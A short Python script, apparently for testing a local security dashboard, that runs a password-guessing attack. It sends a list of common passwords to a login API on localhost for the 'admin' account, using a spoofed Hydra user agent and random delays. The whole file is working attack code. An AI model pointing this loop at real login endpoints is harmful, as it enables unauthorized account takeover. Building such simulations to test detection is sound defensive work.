import requests
import time
import random

TARGET_URL = "http://localhost:8005/api/auth/login"
USERNAME_TO_ATTACK = "admin"

COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "12345", "123456789", "admin123",
    "password123", "root", "toor", "cyber", "shield", "bouclier", "maroc", "phd2024"
]

def simulate_brute_force():
    print(f"🚀 Starting Professional Brute Force Simulation on {TARGET_URL}...")
    print(f"🎯 Target Account: {USERNAME_TO_ATTACK}")
    
    for pwd in COMMON_PASSWORDS:
        try:
            payload = {
                "email": USERNAME_TO_ATTACK,
                "password": pwd
            }
            # Add a slight randomized delay to look like an automated bot
            time.sleep(random.uniform(0.1, 0.5))
            
            headers = {
                "User-Agent": "Hydra/9.5 (https://github.com/vanhauser-thc/thc-hydra)",
                "Content-Type": "application/json"
            }
            
            resp = requests.post(TARGET_URL, json=payload, headers=headers, timeout=2)
            
            if resp.status_code == 200:
                print(f"🔓 SUCCESS! Password found: '{pwd}'")
                break
            else:
                print(f"🔒 [Brute Force] Attempt: {pwd} - Status: {resp.status_code}")
                
        except Exception as e:
            print(f"[Brute Force Sim] Error: {e}")

    print("✅ Brute Force Simulation Complete.")

if __name__ == "__main__":
    simulate_brute_force()
